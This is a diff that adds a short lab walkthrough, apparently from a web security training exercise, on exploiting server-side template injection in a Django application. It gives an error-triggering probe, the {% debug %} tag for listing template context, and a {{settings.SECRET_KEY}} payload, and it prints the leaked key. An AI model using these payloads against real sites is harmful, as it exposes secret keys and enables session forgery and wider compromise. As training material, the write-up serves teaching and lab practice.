@@ -1,0 +1,32 @@
+Server-side template injection with information disclosure via user-supplied objects
+
+Once again we start by trying to generate an error to observe the underlying library:
+
+<p>Hurry! Only {{product.stock}} left of {{product.name}} at ${{<%[%'"}}%\.</p>
+
+Hit preview and we get an error:
+Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"' 
+
+So we're working with django.
+
+Checking the djnago documentation, we find the debug function, {% debug %}:
+https://docs.djangoproject.com/en/dev/ref/templates/builtins/#debug
+
+Let's triggget it to see what we have access to:
+
+<p>Hurry! Only {{product.stock}} left of {{product.name}} at {% debug %}</p>
+
+Hit preview and you'll get a rather lengthy response. We only care about the settings object:
+'settings': <LazySettings "None">}
+
+Let's check the doc:
+https://docs.djangoproject.com/en/3.0/ref/settings/
+
+We're after the secret key so let's try that:
+{{settings.SECRET_KEY}}
+<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{settings.SECRET_KEY}}</p>
+
+Nice, we got our key:
+<p>Hurry! Only 393 left of Hydrated Crackers at dz4e28nlj25dgiere325p8q3476d3fel</p> 
+
+Submit it and you're done.
